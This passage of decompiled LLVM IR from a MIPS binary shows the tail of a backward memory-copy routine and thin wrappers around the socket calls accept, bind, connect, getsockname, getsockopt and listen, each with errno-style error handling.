  %v2_405998 = add i32 %v1_405998, 8
  %v3_405998 = inttoptr i32 %v2_405998 to i32*
  store i32 %v0_405998, i32* %v3_405998, align 4
  %v0_40599c = load i32, i32* %a0.global-to-local, align 4
  %v1_40599c = add i32 %v0_40599c, 4
  %v2_40599c = inttoptr i32 %v1_40599c to i32*
  %v3_40599c = load i32, i32* %v2_40599c, align 4
  store i32 %v3_40599c, i32* %v0.global-to-local, align 4
  %v0_4059a0 = load i32, i32* %t1.global-to-local, align 4
  %v1_4059a0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4059a0 = add i32 %v1_4059a0, 4
  %v3_4059a0 = inttoptr i32 %v2_4059a0 to i32*
  store i32 %v0_4059a0, i32* %v3_4059a0, align 4
  %v0_4059a4 = load i32, i32* %t0.global-to-local, align 4
  %v1_4059a4 = add i32 %v0_4059a4, -8
  store i32 %v1_4059a4, i32* %t0.global-to-local, align 4
  %v0_4059a8 = load i32, i32* %a0.global-to-local, align 4
  %v1_4059a8 = inttoptr i32 %v0_4059a8 to i32*
  %v2_4059a8 = load i32, i32* %v1_4059a8, align 4
  store i32 %v2_4059a8, i32* %t1.global-to-local, align 4
  %v0_4059ac = load i32, i32* %v0.global-to-local, align 4
  %v1_4059ac = load i32, i32* %v1.global-to-local, align 4
  %v2_4059ac = inttoptr i32 %v1_4059ac to i32*
  store i32 %v0_4059ac, i32* %v2_4059ac, align 4
  %v0_4059b0 = load i32, i32* %t0.global-to-local, align 4
  %v1_4059b0 = icmp eq i32 %v0_4059b0, 0
  %v2_4059b0 = load i32, i32* %v1.global-to-local, align 4
  %v3_4059b0 = add i32 %v2_4059b0, -32
  store i32 %v3_4059b0, i32* %v1.global-to-local, align 4
  br i1 %v1_4059b0, label %dec_label_pc_4059c0, label %dec_label_pc_4059b4

dec_label_pc_4059b4:                              ; preds = %dec_label_pc_40588c
  %v0_4059bc = load i32, i32* %a0.global-to-local, align 4
  %v1_4059bc = add i32 %v0_4059bc, -32
  store i32 %v1_4059bc, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4059c0

dec_label_pc_4059c0:                              ; preds = %dec_label_pc_40588c, %dec_label_pc_4059b4
  %v0_4059c4 = load i32, i32* %t1.global-to-local, align 4
  %v2_4059c4 = add i32 %v2_4059b0, -4
  %v3_4059c4 = inttoptr i32 %v2_4059c4 to i32*
  store i32 %v0_4059c4, i32* %v3_4059c4, align 4
  %v0_4059c8.pre = load i32, i32* %v0.global-to-local, align 4
  %v0_4059d0.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_4059d8.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_4059c8

dec_label_pc_4059c8:                              ; preds = %dec_label_pc_405880, %dec_label_pc_4059c0
  %v0_405a24 = phi i32 [ %v3_405888, %dec_label_pc_405880 ], [ %v0_4059d8.pre, %dec_label_pc_4059c0 ]
  %v0_4059d0 = phi i32 [ %v0_405884.lcssa, %dec_label_pc_405880 ], [ %v0_4059d0.pre, %dec_label_pc_4059c0 ]
  %v0_4059c8 = phi i32 [ %v1_405884, %dec_label_pc_405880 ], [ %v0_4059c8.pre, %dec_label_pc_4059c0 ]
  %v1_4059c8 = mul i32 %v0_4059c8, 8
  store i32 %v1_4059c8, i32* %t4.global-to-local, align 4
  %v2_4059d0 = and i32 %v0_4059d0, -4
  store i32 %v2_4059d0, i32* %t0.global-to-local, align 4
  %v1_4059d8 = urem i32 %v0_405a24, 4
  store i32 %v1_4059d8, i32* %v1.global-to-local, align 4
  %v2_4059dc = sub i32 32, %v1_4059c8
  store i32 %v2_4059dc, i32* %t5.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  store i32 %v0_405a24, i32* %t3.global-to-local, align 4
  %v1_4059e8 = add i32 %v2_4059d0, 4
  store i32 %v1_4059e8, i32* %a0.global-to-local, align 4
  %v2_4059ec = icmp eq i32 %v1_4059d8, 1
  %v3_4059ec = load i32, i32* %t2.global-to-local, align 4
  store i32 %v3_4059ec, i32* %a3.global-to-local, align 4
  br i1 %v2_4059ec, label %dec_label_pc_405a5c, label %dec_label_pc_4059f0

dec_label_pc_4059f0:                              ; preds = %dec_label_pc_4059c8
  %v1_4059f4 = icmp eq i32 %v1_4059d8, 0
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v1_4059f4, label %dec_label_pc_405a48, label %dec_label_pc_4059f8

dec_label_pc_4059f8:                              ; preds = %dec_label_pc_4059f0
  store i32 3, i32* %v0.global-to-local, align 4
  %trunc = trunc i32 %v0_405a24 to i2
  switch i2 %trunc, label %dec_label_pc_405a08 [
    i2 -2, label %dec_label_pc_405a18
    i2 -1, label %dec_label_pc_405a30
  ]

dec_label_pc_405a08:                              ; preds = %dec_label_pc_4059f8
  store i32 0, i32* %t1.global-to-local, align 4
  store i32 0, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_405a18

dec_label_pc_405a18:                              ; preds = %dec_label_pc_4059f8, %dec_label_pc_405a08
  %v0_405a18 = phi i32 [ %v2_4059d0, %dec_label_pc_4059f8 ], [ 0, %dec_label_pc_405a08 ]
  %v1_405a18 = add i32 %v0_405a18, -8
  store i32 %v1_405a18, i32* %a0.global-to-local, align 4
  %v2_405a1c = inttoptr i32 %v0_405a18 to i32*
  %v3_405a1c = load i32, i32* %v2_405a1c, align 4
  store i32 %v3_405a1c, i32* %t1.global-to-local, align 4
  %v1_405a20 = add i32 %v0_405a18, -4
  %v2_405a20 = inttoptr i32 %v1_405a20 to i32*
  %v3_405a20 = load i32, i32* %v2_405a20, align 4
  store i32 %v3_405a20, i32* %t0.global-to-local, align 4
  %v1_405a24 = add i32 %v0_405a24, 2
  store i32 %v1_405a24, i32* %t3.global-to-local, align 4
  %v1_405a2c = add i32 %v3_4059ec, -4
  store i32 %v1_405a2c, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405a30

dec_label_pc_405a30:                              ; preds = %dec_label_pc_4059f8, %dec_label_pc_405a18
  %v0_405a3c = phi i32 [ %v1_405a24, %dec_label_pc_405a18 ], [ %v0_405a24, %dec_label_pc_4059f8 ]
  %v0_405a30 = phi i32 [ %v3_405a20, %dec_label_pc_405a18 ], [ %v2_4059d0, %dec_label_pc_4059f8 ]
  %v1_405a30 = add i32 %v0_405a30, -12
  store i32 %v1_405a30, i32* %a0.global-to-local, align 4
  %v2_405a34 = inttoptr i32 %v0_405a30 to i32*
  %v3_405a34 = load i32, i32* %v2_405a34, align 4
  store i32 %v3_405a34, i32* %t0.global-to-local, align 4
  %v1_405a38 = add i32 %v0_405a30, -4
  %v2_405a38 = inttoptr i32 %v1_405a38 to i32*
  %v3_405a38 = load i32, i32* %v2_405a38, align 4
  store i32 %v3_405a38, i32* %t1.global-to-local, align 4
  %v1_405a3c = add i32 %v0_405a3c, 1
  store i32 %v1_405a3c, i32* %t3.global-to-local, align 4
  %v1_405a44 = add i32 %v3_4059ec, -8
  store i32 %v1_405a44, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405a48

dec_label_pc_405a48:                              ; preds = %dec_label_pc_4059f0, %dec_label_pc_405a30
  %v0_405a6811 = phi i32 [ %v0_405a24, %dec_label_pc_4059f0 ], [ %v1_405a3c, %dec_label_pc_405a30 ]
  %v0_405a48 = phi i32 [ %v2_4059d0, %dec_label_pc_4059f0 ], [ %v3_405a34, %dec_label_pc_405a30 ]
  %v1_405a48 = add i32 %v0_405a48, -16
  store i32 %v1_405a48, i32* %a0.global-to-local, align 4
  %v2_405a4c = inttoptr i32 %v0_405a48 to i32*
  %v3_405a4c = load i32, i32* %v2_405a4c, align 4
  store i32 %v3_405a4c, i32* %t1.global-to-local, align 4
  %v1_405a50 = add i32 %v0_405a48, -4
  %v2_405a50 = inttoptr i32 %v1_405a50 to i32*
  %v3_405a50 = load i32, i32* %v2_405a50, align 4
  store i32 %v3_405a50, i32* %t0.global-to-local, align 4
  %v1_405a58 = add i32 %v3_4059ec, -12
  store i32 %v1_405a58, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405a5c

dec_label_pc_405a5c:                              ; preds = %dec_label_pc_4059c8, %dec_label_pc_405a48
  %v0_405a68 = phi i32 [ %v0_405a24, %dec_label_pc_4059c8 ], [ %v0_405a6811, %dec_label_pc_405a48 ]
  %v0_405a5c = phi i32 [ %v2_4059d0, %dec_label_pc_4059c8 ], [ %v3_405a50, %dec_label_pc_405a48 ]
  %v1_405a5c = add i32 %v0_405a5c, -20
  store i32 %v1_405a5c, i32* %a0.global-to-local, align 4
  %v2_405a60 = inttoptr i32 %v0_405a5c to i32*
  %v3_405a60 = load i32, i32* %v2_405a60, align 4
  store i32 %v3_405a60, i32* %t0.global-to-local, align 4
  %v1_405a64 = add i32 %v0_405a5c, -4
  %v2_405a64 = inttoptr i32 %v1_405a64 to i32*
  %v3_405a64 = load i32, i32* %v2_405a64, align 4
  store i32 %v3_405a64, i32* %t1.global-to-local, align 4
  %v1_405a68 = add i32 %v0_405a68, -1
  store i32 %v1_405a68, i32* %t3.global-to-local, align 4
  %v1_405a6c = add i32 %v3_4059ec, -16
  store i32 %v1_405a6c, i32* %a3.global-to-local, align 4
  %v2_405a70 = lshr i32 %v3_405a60, %v2_4059dc
  store i32 %v2_405a70, i32* %v1.global-to-local, align 4
  %v2_405a74 = shl i32 %v3_405a64, %v1_4059c8
  %v2_405a78 = or i32 %v2_405a74, %v2_405a70
  store i32 %v2_405a78, i32* %v0.global-to-local, align 4
  %v1_405a7c = add i32 %v0_405a5c, -8
  %v2_405a7c = inttoptr i32 %v1_405a7c to i32*
  %v3_405a7c = load i32, i32* %v2_405a7c, align 4
  store i32 %v3_405a7c, i32* %t0.global-to-local, align 4
  %v2_405a80 = add i32 %v3_4059ec, -4
  %v3_405a80 = inttoptr i32 %v2_405a80 to i32*
  store i32 %v2_405a78, i32* %v3_405a80, align 4
  %v0_405a84 = load i32, i32* %t1.global-to-local, align 4
  %v1_405a84 = load i32, i32* %t5.global-to-local, align 4
  %v2_405a84 = lshr i32 %v0_405a84, %v1_405a84
  store i32 %v2_405a84, i32* %v1.global-to-local, align 4
  %v0_405a88 = load i32, i32* %t0.global-to-local, align 4
  %v1_405a88 = load i32, i32* %t4.global-to-local, align 4
  %v2_405a88 = shl i32 %v0_405a88, %v1_405a88
  %v2_405a8c = or i32 %v2_405a88, %v2_405a84
  store i32 %v2_405a8c, i32* %v0.global-to-local, align 4
  %v0_405a90 = load i32, i32* %a0.global-to-local, align 4
  %v1_405a90 = add i32 %v0_405a90, 8
  %v2_405a90 = inttoptr i32 %v1_405a90 to i32*
  %v3_405a90 = load i32, i32* %v2_405a90, align 4
  store i32 %v3_405a90, i32* %t1.global-to-local, align 4
  %v1_405a94 = load i32, i32* %a3.global-to-local, align 4
  %v2_405a94 = add i32 %v1_405a94, 8
  %v3_405a94 = inttoptr i32 %v2_405a94 to i32*
  store i32 %v2_405a8c, i32* %v3_405a94, align 4
  %v0_405a98 = load i32, i32* %t0.global-to-local, align 4
  %v1_405a98 = load i32, i32* %t5.global-to-local, align 4
  %v2_405a98 = lshr i32 %v0_405a98, %v1_405a98
  store i32 %v2_405a98, i32* %v1.global-to-local, align 4
  %v0_405a9c = load i32, i32* %t1.global-to-local, align 4
  %v1_405a9c = load i32, i32* %t4.global-to-local, align 4
  %v2_405a9c = shl i32 %v0_405a9c, %v1_405a9c
  %v2_405aa0 = or i32 %v2_405a9c, %v2_405a98
  store i32 %v2_405aa0, i32* %v0.global-to-local, align 4
  %v0_405aa4 = load i32, i32* %a0.global-to-local, align 4
  %v1_405aa4 = add i32 %v0_405aa4, 4
  %v2_405aa4 = inttoptr i32 %v1_405aa4 to i32*
  %v3_405aa4 = load i32, i32* %v2_405aa4, align 4
  store i32 %v3_405aa4, i32* %t0.global-to-local, align 4
  %v1_405aa8 = load i32, i32* %a3.global-to-local, align 4
  %v2_405aa8 = add i32 %v1_405aa8, 4
  %v3_405aa8 = inttoptr i32 %v2_405aa8 to i32*
  store i32 %v2_405aa0, i32* %v3_405aa8, align 4
  %v0_405aac = load i32, i32* %t1.global-to-local, align 4
  %v1_405aac = load i32, i32* %t5.global-to-local, align 4
  %v2_405aac = lshr i32 %v0_405aac, %v1_405aac
  store i32 %v2_405aac, i32* %v1.global-to-local, align 4
  %v0_405ab0 = load i32, i32* %t0.global-to-local, align 4
  %v1_405ab0 = load i32, i32* %t4.global-to-local, align 4
  %v2_405ab0 = shl i32 %v0_405ab0, %v1_405ab0
  %v2_405ab4 = or i32 %v2_405ab0, %v2_405aac
  store i32 %v2_405ab4, i32* %v0.global-to-local, align 4
  %v0_405ab8 = load i32, i32* %t3.global-to-local, align 4
  %v1_405ab8 = add i32 %v0_405ab8, -4
  store i32 %v1_405ab8, i32* %t3.global-to-local, align 4
  %v0_405abc = load i32, i32* %a0.global-to-local, align 4
  %v1_405abc = inttoptr i32 %v0_405abc to i32*
  %v2_405abc = load i32, i32* %v1_405abc, align 4
  store i32 %v2_405abc, i32* %t1.global-to-local, align 4
  %v1_405ac0 = load i32, i32* %a3.global-to-local, align 4
  %v2_405ac0 = inttoptr i32 %v1_405ac0 to i32*
  store i32 %v2_405ab4, i32* %v2_405ac0, align 4
  %v0_405ac4 = load i32, i32* %t3.global-to-local, align 4
  %v1_405ac4 = icmp eq i32 %v0_405ac4, 0
  %v2_405ac4 = load i32, i32* %a3.global-to-local, align 4
  %v3_405ac4 = add i32 %v2_405ac4, -16
  store i32 %v3_405ac4, i32* @a3, align 4
  br i1 %v1_405ac4, label %dec_label_pc_405ad4, label %dec_label_pc_405ac8

dec_label_pc_405ac8:                              ; preds = %dec_label_pc_405a5c
  %v0_405ad0 = load i32, i32* %a0.global-to-local, align 4
  %v1_405ad0 = add i32 %v0_405ad0, -16
  store i32 %v1_405ad0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405ad4

dec_label_pc_405ad4:                              ; preds = %dec_label_pc_405a5c, %dec_label_pc_405ac8
  %v0_405ad4 = load i32, i32* %t1.global-to-local, align 4
  %v1_405ad4 = load i32, i32* %t4.global-to-local, align 4
  %v2_405ad4 = shl i32 %v0_405ad4, %v1_405ad4
  %v0_405ad8 = load i32, i32* %t0.global-to-local, align 4
  %v1_405ad8 = load i32, i32* %t5.global-to-local, align 4
  %v2_405ad8 = lshr i32 %v0_405ad8, %v1_405ad8
  %v2_405adc = or i32 %v2_405ad8, %v2_405ad4
  %v2_405ae0 = add i32 %v2_405ac4, -4
  %v3_405ae0 = inttoptr i32 %v2_405ae0 to i32*
  store i32 %v2_405adc, i32* %v3_405ae0, align 4
  %v0_405ae8 = load i32, i32* %a2.global-to-local, align 4
  %v2_405ae8 = and i32 %v0_405ae8, -4
  store i32 %v2_405ae8, i32* %v0.global-to-local, align 4
  %v0_405aec = load i32, i32* %t2.global-to-local, align 4
  %v2_405aec = sub i32 %v0_405aec, %v2_405ae8
  store i32 %v2_405aec, i32* %t2.global-to-local, align 4
  %v0_405af0 = load i32, i32* %a1.global-to-local, align 4
  %v2_405af0 = sub i32 %v0_405af0, %v2_405ae8
  store i32 %v2_405af0, i32* %a1.global-to-local, align 4
  %v1_405af4 = urem i32 %v0_405ae8, 4
  store i32 %v1_405af4, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405af8

dec_label_pc_405af8:                              ; preds = %dec_label_pc_40584c.dec_label_pc_405af8_crit_edge, %dec_label_pc_405ad4
  %v0_405b0417 = phi i32 [ %v4_405854, %dec_label_pc_40584c.dec_label_pc_405af8_crit_edge ], [ %v2_405aec, %dec_label_pc_405ad4 ]
  %v0_405b0014 = phi i32 [ %v2_405850, %dec_label_pc_40584c.dec_label_pc_405af8_crit_edge ], [ %v2_405af0, %dec_label_pc_405ad4 ]
  %v0_405afc = phi i32 [ %v0_405afc.pre, %dec_label_pc_40584c.dec_label_pc_405af8_crit_edge ], [ %v1_405af4, %dec_label_pc_405ad4 ]
  store i32 %v0_405afc, i32* %a2.global-to-local, align 4
  %v1_405b0022 = inttoptr i32 %v0_405b0014 to i8*
  %v2_405b0023 = load i8, i8* %v1_405b0022, align 1
  %v3_405b0024 = zext i8 %v2_405b0023 to i32
  store i32 %v3_405b0024, i32* %v0.global-to-local, align 4
  %v1_405b0425 = add i32 %v0_405b0417, -1
  store i32 %v1_405b0425, i32* %t2.global-to-local, align 4
  %v3_405b0826 = inttoptr i32 %v1_405b0425 to i8*
  store i8 %v2_405b0023, i8* %v3_405b0826, align 1
  %v0_405b0c27 = load i32, i32* %a2.global-to-local, align 4
  %v1_405b0c28 = add i32 %v0_405b0c27, -1
  store i32 %v1_405b0c28, i32* %a2.global-to-local, align 4
  %v1_405b1029 = icmp eq i32 %v1_405b0c28, 0
  %v2_405b1030 = load i32, i32* %a1.global-to-local, align 4
  %v3_405b1031 = add i32 %v2_405b1030, -1
  store i32 %v3_405b1031, i32* %a1.global-to-local, align 4
  br i1 %v1_405b1029, label %dec_label_pc_405b14, label %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge

dec_label_pc_405b00.dec_label_pc_405b00_crit_edge: ; preds = %dec_label_pc_405af8, %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge
  %v3_405b1032 = phi i32 [ %v3_405b10, %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge ], [ %v3_405b1031, %dec_label_pc_405af8 ]
  %v0_405b04.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_405b00 = inttoptr i32 %v3_405b1032 to i8*
  %v2_405b00 = load i8, i8* %v1_405b00, align 1
  %v3_405b00 = zext i8 %v2_405b00 to i32
  store i32 %v3_405b00, i32* %v0.global-to-local, align 4
  %v1_405b04 = add i32 %v0_405b04.pre, -1
  store i32 %v1_405b04, i32* %t2.global-to-local, align 4
  %v3_405b08 = inttoptr i32 %v1_405b04 to i8*
  store i8 %v2_405b00, i8* %v3_405b08, align 1
  %v0_405b0c = load i32, i32* %a2.global-to-local, align 4
  %v1_405b0c = add i32 %v0_405b0c, -1
  store i32 %v1_405b0c, i32* %a2.global-to-local, align 4
  %v1_405b10 = icmp eq i32 %v1_405b0c, 0
  %v2_405b10 = load i32, i32* %a1.global-to-local, align 4
  %v3_405b10 = add i32 %v2_405b10, -1
  store i32 %v3_405b10, i32* %a1.global-to-local, align 4
  br i1 %v1_405b10, label %dec_label_pc_405b14, label %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge

dec_label_pc_405b14:                              ; preds = %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge, %dec_label_pc_405af8
  %v2_405b10.lcssa = phi i32 [ %v2_405b1030, %dec_label_pc_405af8 ], [ %v2_405b10, %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge ]
  store i32 %v2_405b10.lcssa, i32* %a1.global-to-local, align 4
  %v0_405b1c = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_405b1c, i32* %v0.global-to-local, align 4
  ret i32 %v0_405b1c

; uselistorder directives
  uselistorder i32 %v3_405b10, { 1, 0 }
  uselistorder i32 %v1_405af4, { 1, 0 }
  uselistorder i32 %v0_405a5c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_405a48, { 2, 1, 0 }
  uselistorder i32 %v0_405a30, { 2, 1, 0 }
  uselistorder i32 %v0_405a18, { 2, 1, 0 }
  uselistorder i32 %v1_4059d8, { 2, 1, 0 }
  uselistorder i32 %v2_4059d0, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_4059c8, { 2, 1, 0 }
  uselistorder i32 %v0_405a24, { 4, 3, 2, 5, 1, 6, 0 }
  uselistorder i32 %v3_405888, { 3, 2, 0, 1 }
  uselistorder i32 %v1_405884, { 2, 1, 0 }
  uselistorder i32 %v0_405884.lcssa, { 2, 1, 0 }
  uselistorder i32 %v1_40585c, { 2, 1, 0 }
  uselistorder i32 %v4_405854, { 2, 1, 0, 3 }
  uselistorder i32 %v2_405850, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 29, 30, 25, 26, 27, 28 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 32, 27, 28, 29, 30 }
  uselistorder i32* %t2.global-to-local, { 0, 4, 5, 1, 7, 8, 9, 2, 6, 10, 3 }
  uselistorder i32* %gp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a3.global-to-local, { 3, 0, 2, 1, 4, 7, 5, 6, 8, 9, 10, 11 }
  uselistorder i32* %a2.global-to-local, { 0, 6, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %a1.global-to-local, { 0, 2, 7, 8, 5, 1, 11, 10, 12, 3, 4, 9, 13, 6 }
  uselistorder i32 5, { 5, 2, 0, 3, 6, 7, 8, 9, 4, 1 }
  uselistorder i32 %arg3, { 4, 0, 1, 5, 3, 2, 6 }
  uselistorder label %dec_label_pc_405b00.dec_label_pc_405b00_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_405af8, { 1, 0 }
  uselistorder label %dec_label_pc_405ad4, { 1, 0 }
  uselistorder label %dec_label_pc_405a5c, { 1, 0 }
  uselistorder label %dec_label_pc_405a48, { 1, 0 }
  uselistorder label %dec_label_pc_405a30, { 1, 0 }
  uselistorder label %dec_label_pc_405a18, { 1, 0 }
  uselistorder label %dec_label_pc_4059c8, { 1, 0 }
  uselistorder label %dec_label_pc_4059c0, { 1, 0 }
  uselistorder label %dec_label_pc_40586c.dec_label_pc_40586c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_40584c, { 1, 0 }
}

define i32 @function_405b30(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405b30:
  %s0.global-to-local = alloca i32, align 4
  %v5_405b50 = inttoptr i32 %arg3 to i32*
  %v6_405b50 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_405b50)
  %v3_405b54 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405b54, i32* @t9, align 4
  %v1_405b58 = icmp eq i32 %arg4, 0
  store i32 %v6_405b50, i32* %s0.global-to-local, align 4
  br i1 %v1_405b58, label %dec_label_pc_405b74, label %dec_label_pc_405b5c

dec_label_pc_405b5c:                              ; preds = %dec_label_pc_405b30
  %v1_405b60 = call i32 @function_4056e0()
  %v0_405b6c = load i32, i32* %s0.global-to-local, align 4
  %v2_405b6c = inttoptr i32 %v1_405b60 to i32*
  store i32 %v0_405b6c, i32* %v2_405b6c, align 4
  br label %dec_label_pc_405b74

dec_label_pc_405b74:                              ; preds = %dec_label_pc_405b30, %dec_label_pc_405b5c
  %v4_405b7c = phi i32 [ %v6_405b50, %dec_label_pc_405b30 ], [ -1, %dec_label_pc_405b5c ]
  ret i32 %v4_405b7c

; uselistorder directives
  uselistorder label %dec_label_pc_405b74, { 1, 0 }
}

define i32 @function_405b90(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405b90:
  %s0.global-to-local = alloca i32, align 4
  %v5_405bb0 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  %v3_405bb4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405bb4, i32* @t9, align 4
  %v0_405bb8 = load i32, i32* @a3, align 4
  %v1_405bb8 = icmp eq i32 %v0_405bb8, 0
  store i32 %v5_405bb0, i32* %s0.global-to-local, align 4
  br i1 %v1_405bb8, label %dec_label_pc_405bd4, label %dec_label_pc_405bbc

dec_label_pc_405bbc:                              ; preds = %dec_label_pc_405b90
  %v1_405bc0 = call i32 @function_4056e0()
  %v0_405bcc = load i32, i32* %s0.global-to-local, align 4
  %v2_405bcc = inttoptr i32 %v1_405bc0 to i32*
  store i32 %v0_405bcc, i32* %v2_405bcc, align 4
  br label %dec_label_pc_405bd4

dec_label_pc_405bd4:                              ; preds = %dec_label_pc_405b90, %dec_label_pc_405bbc
  %v4_405bdc = phi i32 [ %v5_405bb0, %dec_label_pc_405b90 ], [ -1, %dec_label_pc_405bbc ]
  ret i32 %v4_405bdc

; uselistorder directives
  uselistorder label %dec_label_pc_405bd4, { 1, 0 }
}

define i32 @function_405bf0(i32 %arg1, %sockaddr* %arg2) local_unnamed_addr {
dec_label_pc_405bf0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* @a1, align 4
  %v4_405c10 = load i32, i32* @a2, align 4
  %v5_405c10 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %v4_405c10)
  %v3_405c14 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405c14, i32* @t9, align 4
  %v0_405c18 = load i32, i32* @a3, align 4
  %v1_405c18 = icmp eq i32 %v0_405c18, 0
  store i32 %v5_405c10, i32* %s0.global-to-local, align 4
  br i1 %v1_405c18, label %dec_label_pc_405c34, label %dec_label_pc_405c1c

dec_label_pc_405c1c:                              ; preds = %dec_label_pc_405bf0
  %v1_405c20 = call i32 @function_4056e0()
  %v0_405c2c = load i32, i32* %s0.global-to-local, align 4
  %v2_405c2c = inttoptr i32 %v1_405c20 to i32*
  store i32 %v0_405c2c, i32* %v2_405c2c, align 4
  br label %dec_label_pc_405c34

dec_label_pc_405c34:                              ; preds = %dec_label_pc_405bf0, %dec_label_pc_405c1c
  %v4_405c3c = phi i32 [ %v5_405c10, %dec_label_pc_405bf0 ], [ -1, %dec_label_pc_405c1c ]
  ret i32 %v4_405c3c

; uselistorder directives
  uselistorder label %dec_label_pc_405c34, { 1, 0 }
}

define i32 @function_405c50(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c50:
  %s0.global-to-local = alloca i32, align 4
  %v5_405c70 = inttoptr i32 %arg3 to i32*
  %v6_405c70 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_405c70)
  %v3_405c74 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405c74, i32* @t9, align 4
  %v0_405c78 = load i32, i32* @a3, align 4
  %v1_405c78 = icmp eq i32 %v0_405c78, 0
  store i32 %v6_405c70, i32* %s0.global-to-local, align 4
  br i1 %v1_405c78, label %dec_label_pc_405c94, label %dec_label_pc_405c7c

dec_label_pc_405c7c:                              ; preds = %dec_label_pc_405c50
  %v1_405c80 = call i32 @function_4056e0()
  %v0_405c8c = load i32, i32* %s0.global-to-local, align 4
  %v2_405c8c = inttoptr i32 %v1_405c80 to i32*
  store i32 %v0_405c8c, i32* %v2_405c8c, align 4
  br label %dec_label_pc_405c94

dec_label_pc_405c94:                              ; preds = %dec_label_pc_405c50, %dec_label_pc_405c7c
  %v4_405c9c = phi i32 [ %v6_405c70, %dec_label_pc_405c50 ], [ -1, %dec_label_pc_405c7c ]
  ret i32 %v4_405c9c

; uselistorder directives
  uselistorder label %dec_label_pc_405c94, { 1, 0 }
}

define i32 @function_405cb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405cb0:
  %s0.global-to-local = alloca i32, align 4
  %v3_405ce8 = load i32, i32* @a3, align 4
  %v4_405ce8 = inttoptr i32 %v3_405ce8 to i32*
  %v5_405ce8 = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %v4_405ce8, i32* null)
  %v3_405cf0 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405cf0, i32* @t9, align 4
  %v0_405cf4 = load i32, i32* @a3, align 4
  %v1_405cf4 = icmp eq i32 %v0_405cf4, 0
  store i32 %v5_405ce8, i32* %s0.global-to-local, align 4
  br i1 %v1_405cf4, label %dec_label_pc_405d10, label %dec_label_pc_405cf8

dec_label_pc_405cf8:                              ; preds = %dec_label_pc_405cb0
  %v1_405cfc = call i32 @function_4056e0()
  %v0_405d08 = load i32, i32* %s0.global-to-local, align 4
  %v2_405d08 = inttoptr i32 %v1_405cfc to i32*
  store i32 %v0_405d08, i32* %v2_405d08, align 4
  br label %dec_label_pc_405d10

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405cb0, %dec_label_pc_405cf8
  %v4_405d20 = phi i32 [ %v5_405ce8, %dec_label_pc_405cb0 ], [ -1, %dec_label_pc_405cf8 ]
  ret i32 %v4_405d20

; uselistorder directives
  uselistorder label %dec_label_pc_405d10, { 1, 0 }
}

define i32 @function_405d30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405d30:
  %s0.global-to-local = alloca i32, align 4
  %v2_405d50 = call i32 @listen(i32 %arg1, i32 %arg2)
  %v3_405d54 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405d54, i32* @t9, align 4
  %v0_405d58 = load i32, i32* @a3, align 4
  %v1_405d58 = icmp eq i32 %v0_405d58, 0
  store i32 %v2_405d50, i32* %s0.global-to-local, align 4
  br i1 %v1_405d58, label %dec_label_pc_405d74, label %dec_label_pc_405d5c

dec_label_pc_405d5c:                              ; preds = %dec_label_pc_405d30
  %v1_405d60 = call i32 @function_4056e0()
  %v0_405d6c = load i32, i32* %s0.global-to-local, align 4
  %v2_405d6c = inttoptr i32 %v1_405d60 to i32*
  store i32 %v0_405d6c, i32* %v2_405d6c, align 4
  br label %dec_label_pc_405d74

dec_label_pc_405d74:                              ; preds = %dec_label_pc_405d30, %dec_label_pc_405d5c
  %v4_405d7c = phi i32 [ %v2_405d50, %dec_label_pc_405d30 ], [ -1, %dec_label_pc_405d5c ]
  ret i32 %v4_405d7c

; uselistorder directives
  uselistorder label %dec_label_pc_405d74, { 1, 0 }
}

